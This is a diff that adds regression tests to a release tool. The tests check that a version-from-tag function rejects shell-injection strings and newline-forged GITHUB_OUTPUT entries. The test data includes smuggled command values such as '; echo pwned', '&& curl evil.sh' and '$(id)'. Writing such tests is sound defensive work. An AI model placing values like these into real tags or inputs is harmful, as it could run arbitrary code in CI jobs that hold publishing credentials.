@@ -43,6 +43,29 @@ describe('versionFromTag', () => {
       expect(() => versionFromTag(tag)).toThrow(ReleaseTargetError);
     }
   });
+
+  it('rejects a tag carrying shell metacharacters', () => {
+    // The version reaches a command line and GITHUB_OUTPUT. A tag was once
+    // able to smuggle `;` through to a shell, executing arbitrary code in a
+    // job that holds an npm-publishing OIDC identity.
+    for (const tag of [
+      'v1.0.0-alpha;echo pwned',
+      'v1.0.0 && curl evil.sh',
+      'v1.0.0`id`',
+      'v1.0.0$(id)',
+      'v1.0.0|tee',
+    ]) {
+      expect(() => versionFromTag(tag)).toThrow(ReleaseTargetError);
+    }
+  });
+
+  it('rejects a multi-line tag that could forge extra step outputs', () => {
+    // GITHUB_OUTPUT is newline-delimited `key=value`, so an embedded newline
+    // would let a dispatch input declare outputs the workflow never set.
+    expect(() => versionFromTag('v1.0.0\ndry_run=true')).toThrow(
+      ReleaseTargetError,
+    );
+  });
 });
 
 describe('resolveReleaseTarget', () => {
